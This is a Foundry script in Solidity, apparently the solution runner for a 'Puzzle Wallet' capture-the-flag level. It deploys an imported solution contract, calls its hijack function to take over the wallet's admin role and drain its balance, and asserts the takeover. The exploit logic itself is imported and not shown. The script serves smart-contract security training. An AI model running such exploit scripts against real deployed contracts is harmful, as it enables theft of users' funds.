// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import { IPuzzleWallet } from "./IPuzzleWallet.sol";
import { PuzzleWalletSolution } from "./PuzzleWalletSolution.sol";

contract PuzzleWalletScript is Script {

    IPuzzleWallet puzzleWallet;
    address instanceAddress = 0xe8C34443499BEE50b3b5631bD3e8bfa974ff9613;


    function setUp() public {
        puzzleWallet = IPuzzleWallet(instanceAddress);
    }

    function run() public {
        vm.startBroadcast();
        PuzzleWalletSolution puzzleWalletSolution = new PuzzleWalletSolution();
        puzzleWalletSolution.hijack{value: address(puzzleWallet).balance}(puzzleWallet, payable(tx.origin));
        assert(puzzleWallet.admin() == tx.origin);
        vm.stopBroadcast();
    }
}
